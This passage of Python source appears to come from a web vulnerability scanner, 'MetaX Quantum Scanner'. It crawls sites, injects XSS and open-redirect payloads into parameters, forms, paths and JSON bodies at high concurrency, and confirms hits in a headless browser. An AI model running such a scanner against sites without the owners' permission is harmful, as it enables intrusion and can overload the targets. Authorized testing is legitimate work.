            elif isinstance(res, Exception):
                logger.error(f"Error in inject_path_payloads task for {url}: {type(res).__name__} - {res}")
                
        progress.update(task_id, advance=len(injection_tasks) + 1)
        return results

    async def crawl_website(self, url: str, progress: Progress, task_id: int) -> Tuple[Set[str], Set[str]]:
        base_url_for_scope = normalize_url(url, ignore_query=True, ignore_fragment=True)
        
        crawler = Crawler(self.rm, max_depth=CF.get("crawl_depth", 5))
        await crawler.start_crawling(url, progress, task_id)
        
        # FIX: Filter JS URLs to only those that were discovered and not just the initial page URL
        js_urls_to_fetch = {js for js in crawler.js_files if js != url}

        js_tasks = [self.rm.do_request(js_url, "GET") for js_url in js_urls_to_fetch]
        js_responses = await asyncio.gather(*js_tasks, return_exceptions=True)
        
        for js_url, res in zip(js_urls_to_fetch, js_responses):
            if not isinstance(res, Exception) and res is not None:
                status, js_content, _, _ = res
                if js_content and 200 <= status < 300:
                    new_targets = extract_js_endpoints(js_content, js_url)
                    crawler.targets_to_scan.update({t for t in new_targets if is_same_scope(base_url_for_scope, t)})

        final_targets = {t for t in crawler.targets_to_scan if is_interesting(t)}

        return crawler.visited_normalized, final_targets
        
    def save_results_realtime(self, current_findings: List[Union["VulnResult", "ORResult"]]) -> None:
        """Writes findings to a file immediately for real-time monitoring."""
        realtime_path = Path(CF.get("output_dir")) / CF.get("realtime_file")
        data = {
            "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
            "findings": [{
                "type": "XSS" if isinstance(f, VulnResult) else "OPEN_REDIRECT",
                "url": f.url, "method": f.method, "param": f.param,
                "payload": f.payload if isinstance(f, VulnResult) else f.injected_url,
                "score": f.score if isinstance(f, VulnResult) else 70,
                "verified": f.verified, "severity": f.severity,
                "reason": f.reason.split(" | Final Score:")[0] if isinstance(f, VulnResult) and " | Final Score:" in f.reason else f.reason
            } for f in current_findings]
        }
        try:
            with realtime_path.open("w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            logger.error(f"Failed to save realtime results: {e}")

    async def update_findings(self, new_findings: List[Union["VulnResult", "ORResult"]]):
        """Deduplicates and updates the list of findings, printing confirmed ones."""
        async with self.results_lock:
            for f in new_findings:
                parsed_base = urlparse(f.url)
                
                location_type = "UNKNOWN"
                if f.param == "PATH":
                    location_type = "PATH"
                elif f.param.startswith("JSON"):
                    location_type = "JSON_BODY"
                elif any(re.search(keyword, f.param, re.IGNORECASE) for keyword in self.REDIRECT_PARAM_KEYWORDS):
                     location_type = "REDIRECT" if isinstance(f, ORResult) else "QUERY"
                elif f.method.upper() == "POST":
                    location_type = "FORM"
                elif parsed_base.query:
                    location_type = "QUERY"
                
                if f.param == "PATH":
                    path_segments = parsed_base.path.split('/')
                    base_path = '/'.join(path_segments[:-1])
                    if not base_path: base_path = '/'
                    url_base = urlunparse(parsed_base._replace(path=base_path, query="", fragment=""))
                else:
                    url_base = normalize_url(f.url, ignore_query=True)
                    
                canonical_key = (url_base, f.param, location_type)
                
                current_best = self.deduplicated_findings.get(canonical_key)
                
                is_new_best = True
                if current_best:
                    if isinstance(f, ORResult) and isinstance(current_best, ORResult):
                        is_new_best = False
                    elif isinstance(f, VulnResult):
                        is_new_best = f.verified or f.score > current_best.score

                if is_new_best and f.score >= CF.get("score_filter"):
                    self.deduplicated_findings[canonical_key] = f
                    
                    verb = "VERIFIED" if f.verified else ("OR_FOUND" if isinstance(f, ORResult) else "FOUND")
                    color = "verified" if f.verified else ("highlight" if isinstance(f, ORResult) else ("critical" if f.score >= 98 else ("bold bright_red" if f.score >= 85 else "warning")))
                    
                    url_short_print = url_base.replace(parsed_base.scheme + "://" + parsed_base.netloc, "") or "/"
                    
                    param_name_clean = f.param.split('(')[0].replace(']','')
                    location_detail = f"on [highlight]{param_name_clean}[/highlight] ({location_type.replace('_', ' ')})"

                    console.print(f"[{color}] {verb.ljust(9)}[/] [param]{f.severity.upper():<8}[/param] (S: {f.score}) {location_detail} in {parsed_base.netloc}{url_short_print}", highlight=False)
            
            self.save_results_realtime(list(self.deduplicated_findings.values()))

    async def scan_target(self, url: str, progress: Progress, overall_task_id: int, param_task_id: int) -> None:
        """Handles baseline, reflection check, and all injection types for one URL."""
        
        url_short = f"{urlparse(url).path}?..." if urlparse(url).query else urlparse(url).path
        progress.update(overall_task_id, description=f"[bold bright_cyan]Scanning[/bold bright_cyan]: [param]{url_short[:70]}...[/param]")
        
        try:
            baseline, metadata, base_latency = await self.get_baseline(url)
            
            if not baseline:
                progress.update(overall_task_id, advance=1, description=f"[error]Failed (Baseline)[/error]: [param]{url_short[:70]}...[/param]")
                progress.update(param_task_id, completed=1, total=1, visible=False)
                return

            refl = {}
            if urlparse(url).query:
                refl = await self.detect_reflections(url)

            # --- Workload Estimation ---
            num_payloads = min(len(self.payload_set), CF.get("max_payloads_per_param"))
            num_query_params = len(refl)
            
            work_per_param = (2 * num_payloads + 1)
            form_work = 50
            path_work = len(PayloadManager.PATH_PAYLOADS) + 1
            json_work = len(self.JSON_HEURISTIC_FIELDS) * (1 + 2 * num_payloads)
            
            est_work = (num_query_params * work_per_param) + form_work + path_work + json_work
            est_work = max(1, est_work)
            
            # UX Improvement: Show injection progress for the current URL
            progress.update(param_task_id, total=est_work, completed=0, visible=True, description=f"[bold bright_blue]Injections for[/bold bright_blue]: [param]{url_short[:50]}...[/param]")
            
            injection_tasks: List[Awaitable[Optional[List[Union[VulnResult, ORResult]]]]] = []
            
            # 1. Query Parameters
            if urlparse(url).query:
                injection_tasks.append(self.inject_params(url, baseline, base_latency, refl, metadata, progress, param_task_id))
            else:
                progress.update(param_task_id, advance=len(urlparse(url).query) * work_per_param)
                
            # 2. Forms
            if 'html' in metadata.get("content_type", ""):
                injection_tasks.append(self.inject_forms(url, baseline, base_latency, metadata, progress, param_task_id))
            else:
                progress.update(param_task_id, advance=form_work)

            # 3. Path
            injection_tasks.append(self.inject_path_payloads(url, baseline, base_latency, metadata, progress, param_task_id))
            
            # 4. JSON Body
            injection_tasks.append(self.inject_json_body(url, baseline, base_latency, metadata, progress, param_task_id))
            
            gathered_results = await asyncio.gather(*injection_tasks, return_exceptions=True)
            findings: List[Union[VulnResult, ORResult]] = []
            
            for res in gathered_results:
                # STABILITY FIX: Check for the list of results or an exception
                if not isinstance(res, Exception) and res is not None and isinstance(res, list):
                    findings.extend(res)
                elif isinstance(res, Exception):
                    # This logs the specific error that led to the RuntimeWarning/ValueError when running the original script
                    logger.error(f"Injection sub-task failed for {url}: {type(res).__name__} - {res}")
                
            progress.update(param_task_id, completed=progress.tasks[param_task_id].total, visible=False)
            
            await self.update_findings(findings)
            
            progress.update(overall_task_id, advance=1, description=f"[success]Completed[/success] ({len(findings)} found): [param]{url_short[:70]}...[/param]")

        except Exception as e:
            logger.critical(f"FATAL ERROR in scan_target for {url}: {e}")
            progress.update(param_task_id, completed=progress.tasks[param_task_id].total, visible=False)
            progress.update(overall_task_id, advance=1, description=f"[critical]FATAL ERROR[/critical]: [param]{url_short[:70]}...[/param]")


    async def browser_verify(self, findings: List[Union[VulnResult, ORResult]], progress: Progress, task_id: int) -> List[Union[VulnResult, ORResult]]:
        """Performs dynamic execution verification using Playwright."""
        if not CF.get("verification_enabled"):
            return []
        
        min_score_for_verification = max(CF.get("score_filter", 60), 85)
        to_verify = [f for f in findings if isinstance(f, VulnResult) and f.score >= min_score_for_verification and not f.verified and f.xss_token]

        if not to_verify:
            return []

        progress.update(task_id, total=len(to_verify), description=f"[bold bright_green]Verifying {len(to_verify)} Potential Findings[/bold bright_green]")

        verified_results = []
        browser = None
        try:
            async with async_playwright() as p:
                browser_type = getattr(p, CF.get("browser_type", "chromium"))
                browser = await browser_type.launch(headless=True, args=['--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu', '--window-size=800,600'])
                
                async def verify_one_finding(result: VulnResult):
                    browser_timeout_ms = int(CF.get("browser_timeout") * 1000)
                    
                    async with self.browser_sem:
                        context: BrowserContext = await browser.new_context(
                            user_agent=CF.get("browser_user_agent"),
                            ignore_https_errors=True,
                            viewport={"width": 800, "height": 600},
                            timeout=browser_timeout_ms
                        )
                        await context.add_init_script(BROWSER_HOOK)
                        
                        page: Optional[Page] = None
                        try:
                            page = await context.new_page()
                            is_verified_dialog = False
                            browser_logs = []
                            dialog_coro = asyncio.ensure_future(page.wait_for_event("dialog"))
                            nav_timeout = browser_timeout_ms
                            
                            # Navigation Logic (POST/GET) 
                            if result.method.upper() == "POST" and result.details.get('request_data'):
                                post_data = result.details.get('request_data')
                                if 'raw_body' in post_data and post_data.get('raw_body'):
                                    # Handle raw POST body (like JSON)
                                    await page.route(result.url, lambda route: asyncio.create_task(route.fulfill(
                                        status=200, 
                                        body=post_data['raw_body'],
                                        headers={'Content-Type': post_data.get('content_type', 'text/plain')}
                                    )))
                                    await page.goto(result.url, wait_until="domcontentloaded", timeout=nav_timeout)
                                else:
                                     # Handle x-www-form-urlencoded POST
                                     form_html = f"""
                                     <html>
                                     <body onload="document.getElementById('postform').submit()">
                                         <form id="postform" method="POST" action="{html.escape(result.url)}" enctype="{result.details.get('content_type', 'application/x-www-form-urlencoded')}">
                                             {''.join(f'<input type="hidden" name="{k}" value="{html.escape(str(v), quote=True)}">'.replace("'", "&#x27;") for k, v in post_data.items() if k != 'content_type')}
                                         </form>
                                     </body>
                                     </html>
                                     """
                                     await page.set_content(form_html, wait_until="load", timeout=nav_timeout)
                            else:
                                await page.goto(result.url, wait_until="domcontentloaded", timeout=nav_timeout)
                                
                            payload_lower = result.payload.lower()
                            
                            # DOM Element Interaction Logic 
                            element_handle = await page.evaluate_handle(f"""
                                (function() {{
                                    const token = '{result.xss_token}';
                                    const elements = Array.from(document.querySelectorAll('*'));
                                    for (const el of elements) {{
                                        if (el.innerHTML && el.innerHTML.includes(token)) return el;
                                        if (el.value && el.value.includes(token)) return el;
                                        for (const attr of el.attributes) {{
                                            if (attr.value.includes(token)) return el;
                                        }}
                                    }}
                                    return null;
                                }})()
                            """)
                            
                            if element_handle and element_handle.as_element():
                                element = element_handle.as_element()
                                try:
                                    if "onmouseover" in payload_lower: await element.hover()
                                    if "onfocus" in payload_lower or "autofocus" in payload_lower: await element.focus()
                                    if "onclick" in payload_lower or "onsubmit" in payload_lower or "href" in payload_lower: await element.click(timeout=1000)
                                    if "ontoggle" in payload_lower: await page.evaluate('(el) => { if (el.tagName === "DETAILS" && el.open === false) el.open = true; }', element)
                                    
                                    await page.keyboard.press('Tab')
                                    await page.evaluate('document.body.click()')
                                    
                                except PlaywrightError as pe:
                                    logger.debug(f"Specific interaction failed for {result.xss_token}: {pe.message}")
                                    pass
                                    
                            # Dialog Check
                            try:
                                dialog = await asyncio.wait_for(dialog_coro, timeout=CF.get("browser_wait"))
                                dialog_message = dialog.message
                                await dialog.accept()
                                
                                if result.xss_token in dialog_message:
                                    is_verified_dialog = True
                            except (asyncio.TimeoutError, PlaywrightTimeoutError):
                                pass
                                
                            browser_logs = await page.evaluate("window.__METAXLOG")

                        except (PlaywrightTimeoutError, PlaywrightError) as pe:
                            if page:
                                try:
                                    browser_logs = await page.evaluate("window.__METAXLOG")
                                except PlaywrightError:
                                    browser_logs = []
                            logger.warning(f"Browser error for {result.url}: {type(pe).__name__} - {pe}")
                            
                        except Exception as e:
                            logger.error(f"Unexpected error in verify_one_finding for {result.url}: {e}")

                        finally:
                            # Final Scoring/Update
                            metadata_for_score = {"browser_logs": browser_logs, "verified_dialog": is_verified_dialog}

                            new_score, new_reason = await ScoreEngine.compute_score(
                                result.payload, result.xss_token, "", "", 0.0, 0.0, metadata_for_score
                            )
                            
                            if is_verified_dialog or new_score > result.score:
                                result.verified = is_verified_dialog
                                result.score = max(result.score, new_score)
                                result.reason = new_reason
                                result.severity = result._determine_severity(result.score, result.verified)
                                result.verification_details = f"Confirmed: {is_verified_dialog}. Dynamic Score: {new_score}. Logs: {browser_logs}"
                                await self.update_findings([result])

                            if result.verified or result.score >= min_score_for_verification:
                                verified_results.append(result)
                            
                            # CRITICAL FIX: Close Page and Context consistently
                            if page: await page.close()
                            await context.close()
                            
                            progress.update(task_id, advance=1)

                await asyncio.gather(*[verify_one_finding(r) for r in to_verify], return_exceptions=True)

        except Exception as e:
            logger.critical(f"Fatal error during Playwright setup/execution: {e}")
        finally:
            if browser:
                 await browser.close()
            return [r for r in to_verify if r.verified or r.score >= min_score_for_verification]

    async def run_scan(self, urls: List[str], use_browser: bool = True, out_file: Optional[str] = None) -> None:
        
        valid_urls = [u for u in urls if validators.url(u) and is_interesting(u)]
        if not valid_urls:
            console.print("[error]❌ No valid or interesting URLs provided for scanning. Exiting.[/error]")
            return

        self.deduplicated_findings = {}
        
        async with self.rm:
            start = time.time()
            all_targets: Set[str] = set()
            
            console.rule("[step]Phase 1: Discovery (Crawling)[/step]")
            
            with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), "[progress.percentage]{task.percentage:>3.0f}%", TimeElapsedColumn(), console=console) as progress:
                crawl_task = progress.add_task(f"[bold magenta]Crawling {len(valid_urls)} Targets[/bold magenta]", total=len(valid_urls) * 100) 
                
                all_crawl_tasks = [self.crawl_website(url, progress, crawl_task) for url in valid_urls]
                
                for future in asyncio.as_completed(all_crawl_tasks):
                    try:
                        _, dynamic_targets = await future
                        all_targets.update(dynamic_targets)
                    except Exception as e:
                        logger.error(f"Error during crawl: {e}")
                        
            final_targets = list(all_targets)
            
            if not final_targets:
                console.print("[error]❌ No unique dynamic targets found. Aborting scan.[/error]")
                return

            console.print(f"[success]✅ Discovery Complete. Total unique targets: [highlight]{len(final_targets)}[/highlight][/success]")
            console.rule("[step]Phase 2: Injection and Analysis[/step]")

            self.deduplicated_findings = {}

            with Progress(
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                SpinnerColumn(),
                TimeRemainingColumn(),
                TimeElapsedColumn(),
                console=console
            ) as overall_progress:
                
                scan_task = overall_progress.add_task("[bold bright_cyan]Target Processing[/bold bright_cyan]", total=len(final_targets))
                param_task = overall_progress.add_task("[bold bright_blue]Injection Progress[/bold bright_blue]", total=1, visible=False)
                
                injection_sem = asyncio.Semaphore(AdaptiveScheduler.concurrency(CF.get("concurrent_requests")))
                
                async def run_injection_wrapper(url: str):
                    async with injection_sem:
                        await self.scan_target(url, overall_progress, scan_task, param_task)

                await asyncio.gather(*[run_injection_wrapper(u) for u in final_targets], return_exceptions=True)
                
                overall_progress.update(scan_task, completed=len(final_targets))


            aggregated_findings = list(self.deduplicated_findings.values())
            
            if use_browser and aggregated_findings and CF.get("verification_enabled"):
                console.rule("[step]Phase 3: Browser Verification[/step]")
                min_score_for_verification = max(CF.get("score_filter", 60), 85)
                to_verify = [f for f in aggregated_findings if isinstance(f, VulnResult) and f.score >= min_score_for_verification and not f.verified]
                
                if to_verify:
                    with Progress(
                        TextColumn("[progress.description]{task.description}"),
                        BarColumn(),
                        SpinnerColumn(),
                        TimeRemainingColumn(),
                        TimeElapsedColumn(),
                        console=console
                    ) as verification_progress:
                        ver_task = verification_progress.add_task("[bold bright_green]Verifying Findings[/bold bright_green]", total=len(to_verify))
                        await self.browser_verify(to_verify, verification_progress, ver_task)
                else:
                    console.print("[info]No high-score unverified findings found to check.[/info]")
                    
            final = list(self.deduplicated_findings.values())
            final = [v for v in final if (isinstance(v, ORResult) or (v.verified if CF.get("require_verification") else v.score >= CF.get("score_filter")))]
            
            sev_order = {"Critical": 3, "High": 2, "Medium": 1, "Low": 0, "Info": -1}
            final.sort(key=lambda f: (sev_order.get(f.severity, 0), f.score), reverse=True)
            elapsed = time.time() - start
            output_path = Path(out_file) if out_file else timestamped_file("metax_scan")
            
            results_data = {
                "metadata": {"scan_time": elapsed, "targets": len(final_targets), "findings": len(final),
                             "verification_status": "ENABLED" if use_browser and CF.get("verification_enabled") else "DISABLED",
                             "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')},
                "results": [{
                    "type": "XSS" if isinstance(f, VulnResult) else "OPEN_REDIRECT",
                    "url": f.url,
                    "method": f.method,
                    "param": f.param,
                    "payload": f.payload if isinstance(f, VulnResult) else f.injected_url,
                    "score": f.score,
                    "verified": getattr(f, 'verified', True),
                    "severity": f.severity,
                    "reason": f.reason,
                    "mitigation": f.mitigation
                } for f in final]
            }
            try:
                with output_path.open("w", encoding="utf-8") as f:
                    json.dump(results_data, f, indent=2, ensure_ascii=False)
            except Exception as e:
                console.print(f"[critical]Failed to save final results to {output_path}: {e}[/critical]")
                
            console.rule("[success]✨ Scan Complete[/success]")
            
            # --- FINAL REPORT TABLE (KEPT) ---
            final_table = Table(title=f"MetaX Quantum Findings ({len(final)} Total)", box=box.ROUNDED, border_style="bold bright_green")
            final_table.add_column("✔", justify="center", style="bold", min_width=2)
            final_table.add_column("Type", justify="center", style="bold", min_width=10)
            final_table.add_column("Method", justify="center", min_width=6)
            final_table.add_column("Severity", justify="center", min_width=10)
            final_table.add_column("Score", justify="right", min_width=5)
            final_table.add_column("Resp Time", justify="right", min_width=8)
            final_table.add_column("Location", overflow="fold", min_width=10)
            final_table.add_column("URL Base", overflow="fold", min_width=30)
            final_table.add_column("Payload Snippet", overflow="fold", min_width=20)
            
            color_map = {"Critical": "critical", "High": "bold bright_red", "Medium": "bold bright_cyan", "Low": "bold bright_white", "Info": "dim white"}
            
            if final:
                for r in final:
                    is_or = isinstance(r, ORResult)
                    check = "[verified]✔[/verified]" if r.verified else "[unverified]✘[/unverified]"
                    col = color_map.get(r.severity, "white")
                    
                    type_str = "OR" if is_or else "XSS"

                    parsed_url = urlparse(r.url)
                    
                    if r.param == "PATH":
                        path_segments = parsed_url.path.split('/')
                        base_path = '/'.join(path_segments[:-1])
                        if not base_path: base_path = '/'
                        url_base = urlunparse(parsed_url._replace(path=base_path, query="", fragment=""))
                    else:
                        url_base = normalize_url(r.url, ignore_query=True)
                        
                    payload_source = r.payload if not is_or else r.injected_url
                    
                    snippet_start_idx = payload_source.find('>')
                    if snippet_start_idx != -1 and snippet_start_idx < 5:
                        payload_snippet = payload_source[snippet_start_idx+1:snippet_start_idx+21] + "..." if len(payload_source) > snippet_start_idx+20 else payload_source[snippet_start_idx+1:]
                    else:
                        payload_snippet = payload_source[:20] + "..." if len(payload_source) > 20 else payload_source
                        
                    param_name_clean = r.param.split('(')[0].replace(']','')

                    final_table.add_row(check, f"[{col}]{type_str}[/]", r.method, f"[{col}]{r.severity}[/]", str(r.score), f"{r.resp_time:.2f}s", f"[param]{param_name_clean}[/param]", url_base, payload_snippet)
                    
                console.print(final_table)
            else:
                console.print("[info]No findings met the score filter or verification requirements. Good job! 🛡️[/info]")
                
            console.print(Panel(
                f"Finished in [bold]{elapsed:.2f}s[/bold]\n"
                f"Total Targets Scanned: [bold]{len(final_targets)}[/bold]\n"
                f"Results saved to: [highlight]{output_path}[/highlight]",
                title="[bold bright_green]Summary[/bold bright_green]", border_style="bold bright_green"
            ))

# --- ARGUMENT PARSING AND MAIN LOOP (KEPT) ---

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser("MetaX Quantum Scanner - Advanced Edition", formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("-u", "--url", help="Single URL to scan.")
    parser.add_argument("-f", "--file", help="File with URLs (one per line).")
    parser.add_argument("-b", "--nobrowser", action="store_true", help="Disable browser verification (Phase 3).")
    parser.add_argument("-o", "--output", help="Output JSON file path (overrides default).")
    parser.add_argument("-m", "--mode", choices=["quick", "deep", "comprehensive"],
                             default=CF.get("scan_mode"),
                             help="Select scanning mode:\n"
                                  "  quick: Fast check, low depth, minimal payloads (High FP risk).\n"
                                  "  deep: High depth, more payloads, better baseline (Slowest).\n"
                                  "  comprehensive: Balanced default, good depth and payload count (Recommended).")
    parser.add_argument("-d", "--debug", action="store_true", help="Enable debug logging and show more verbose errors.")
    return parser.parse_args()

def apply_mode(mode: str):
    mode_configs = {
        "quick": {"max_payloads_per_param": 1000, "baseline_samples": 1, "crawl_depth": 1, "base_timeout": 1.0, "concurrent_requests": 3000, "crawler_concurrency": 400, "browser_concurrency": 10, "score_filter": 50, "browser_wait": 2.5, "enable_differential_scoring": False, "fast_html_check": True},
        "deep": {"max_payloads_per_param": 7000, "baseline_samples": 5, "crawl_depth": 7, "base_timeout": 4.0, "concurrent_requests": 500, "crawler_concurrency": 100, "browser_concurrency": 25, "score_filter": 30, "browser_wait": 7.0, "enable_differential_scoring": True, "fast_html_check": False},
        "comprehensive": {"max_payloads_per_param": 5000, "baseline_samples": 2, "crawl_depth": 5, "base_timeout": 1.5, "concurrent_requests": 2000, "crawler_concurrency": 500, "browser_concurrency": 30, "score_filter": 60, "browser_wait": 4.0, "enable_differential_scoring": True, "fast_html_check": False},
    }
    CF.update(mode_configs.get(mode, mode_configs["comprehensive"]))
    CF["scan_mode"] = mode
    # FIX: Ensure logger level is set immediately
    logger.setLevel(logging.DEBUG if CF.get("debug_mode") else logging.INFO)

def main() -> None:
    args = parse_args()
    
    # FIX: Initialize logger level based on args.debug before apply_mode
    if args.debug:
        CF["debug_mode"] = True
    
    apply_mode(args.mode)
    
    if args.debug:
        console.print("[debug]Debug Mode Enabled.[/debug]")

    urls: List[str] = []
    
    if args.url:
        if validators.url(args.url) and is_interesting(args.url):
            urls.append(args.url)
        else:
            console.print("[error]❌ Invalid or uninteresting URL provided via -u.[/error]")
            
    if args.file and os.path.isfile(args.file):
        try:
            with open(args.file, "r", encoding="utf-8") as f:
                urls.extend({l.strip() for l in f if validators.url(l.strip()) and is_interesting(l.strip())})
        except Exception as e:
            console.print(f"[error]❌ Error reading file {args.file}: {e}[/error]")
            
    if urls:
        urls = list(set(urls))
        use_browser = not args.nobrowser

        stats = get_system_stats()
        system_health_panel = Panel(
            f"[info]CPU:[/info] [highlight]{stats['cpu']:.1f}%[/highlight] | "
            f"[info]Memory:[/info] [highlight]{stats['memory']:.1f}%[/highlight]\n"
            f"[info]Concurrency Limit (Dynamic):[/info] [highlight]{stats['current_conc']} / {stats['max_conc']}[/highlight]",
            title="[bold blue]System Health & Throttling[/bold blue]",
            border_style="blue"
        )

        console.print(Panel(
            f"[bold primary]MetaX Quantum Scanner[/bold primary]\n"
            f"[info]Mode:[/info] [highlight]{CF['scan_mode'].upper()}[/highlight] | "
            f"[info]Targets:[/info] [highlight]{len(urls)}[/highlight] | "
            f"[info]Verification:[/info] {'[bold green]ENABLED[/bold green]' if use_browser and CF['verification_enabled'] else '[bold red]DISABLED[/bold red]'}",
            title="[bold magenta]Scan Configuration[/bold magenta]",
            border_style="magenta"
        ))
        
        console.print(system_health_panel)
        
        try:
            # Renamed to QuantumScanner
            scanner = QuantumScanner()
            asyncio.run(scanner.run_scan(urls, use_browser=use_browser, out_file=args.output))
        except RuntimeError as e:
             if "Event loop is closed" in str(e):
                 console.print("[critical]⚠️ Runtime Error: Event loop closed unexpectedly. This can happen with incompatible Python/asyncio setup (especially with Playwright on Windows). Please ensure Playwright dependencies are installed and try running from a fresh terminal.[/critical]")
             else:
                 console.print(f"[critical]A critical runtime error occurred: {e}[/critical]")
        except Exception as e:
            console.print(f"[critical]A critical runtime error occurred: {e}[/critical]")
        sys.exit(0)

    # --- INTERACTIVE MODE (FIXED for instantiation) ---
    state = {"browser_verify": not args.nobrowser, "output_file": args.output}
        
    while True:
        console.print("\n")
        
        stats = get_system_stats()
        system_health_panel = Panel(
            f"[info]CPU:[/info] [highlight]{stats['cpu']:.1f}%[/highlight] | "
            f"[info]Memory:[/info] [highlight]{stats['memory']:.1f}%[/highlight]\n"
            f"[info]Concurrency Limit (Dynamic):[/info] [highlight]{stats['current_conc']} / {stats['max_conc']}[/highlight]",
            title="[bold blue]System Health & Throttling[/bold blue]",
            border_style="blue"
        )
        
        menu_panel = Panel(
            f"[bold primary]MetaX Quantum Scanner Interactive Mode[/bold primary]\n"
            f"[info]Mode:[/info] [highlight]{CF['scan_mode'].upper()}[/highlight] | "
            f"[info]Verification:[/info] {'[bold green]ENABLED[/bold green]' if state['browser_verify'] and CF['verification_enabled'] else '[bold red]DISABLED[/bold red]'}",
            title="[bold magenta]🚀 Interface Menu[/bold magenta]",
            border_style="magenta"
        )
        console.print(menu_panel)
        console.print(system_health_panel)
        
        menu_options = (
            f"[info]1.[/info] Start Single URL Scan\n"
            f"[info]2.[/info] Start Batch File Scan\n"
            f"[info]3.[/info] Toggle Browser Verification\n"
            f"[info]4.[/info] Change Scan Mode ({CF['scan_mode'].upper()})\n"
            f"[info]5.[/info] Exit"
        )
        console.print(menu_options)
        choice = Prompt.ask("[step]Select Option[/step]", choices=["1", "2", "3", "4", "5"], default="1")
        
        # Renamed to QuantumScanner
        scanner = QuantumScanner() 
        
        if choice == "1":
            u = Prompt.ask("[info]Enter a URL[/info]").strip()
            if not validators.url(u):
                console.print("[error]❌ Invalid URL. Please try again.[/error]")
                del scanner 
                continue
            try:
                asyncio.run(scanner.run_scan([u], use_browser=state["browser_verify"], out_file=state["output_file"]))
            except Exception as e:
                console.print(f"[critical]A critical runtime error occurred: {e}[/critical]")
            Prompt.ask("Press Enter to continue...")
            
        elif choice == "2":
            fp = Prompt.ask("[info]Enter file path[/info]").strip()
            if not os.path.isfile(fp):
                console.print("[error]❌ File not found! Please check the path.[/error]")
                del scanner
                continue
            try:
                with open(fp, "r", encoding="utf-8") as f:
                    urls_from_file = {l.strip() for l in f if validators.url(l.strip()) and is_interesting(l.strip())}
            except Exception as e:
                console.print(f"[error]❌ Error reading file: {e}[/error]")
                urls_from_file = set()
                
            if not urls_from_file:
                console.print("[error]❌ No valid, interesting URLs found in the file.[/error]")
                del scanner
                continue
            
            try:
                asyncio.run(scanner.run_scan(list(urls_from_file), use_browser=state["browser_verify"], out_file=state["output_file"]))
            except Exception as e:
                console.print(f"[critical]A critical runtime error occurred: {e}[/critical]")
            Prompt.ask("Press Enter to continue...")
            
        elif choice == "3":
            state["browser_verify"] = not state["browser_verify"]
            console.print(f"[info]Browser verification set to: [highlight]{'ENABLED' if state['browser_verify'] else 'DISABLED'}[/highlight][/info]")
            del scanner
            
        elif choice == "4":
            new_mode = Prompt.ask("[info]Select new mode[/info]", choices=["quick", "deep", "comprehensive"], default=CF["scan_mode"])
            apply_mode(new_mode)
            console.print(f"[info]Scan mode set to: [highlight]{CF['scan_mode'].upper()}[/highlight][/info]")
            del scanner

        else:
            console.print("[success]Exiting MetaX Quantum Scanner. Goodbye! 👋[/success]")
            del scanner
            break
            
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[error]Scan interrupted by user (Ctrl+C). Exiting gracefully.[/error]")
        sys.exit(1)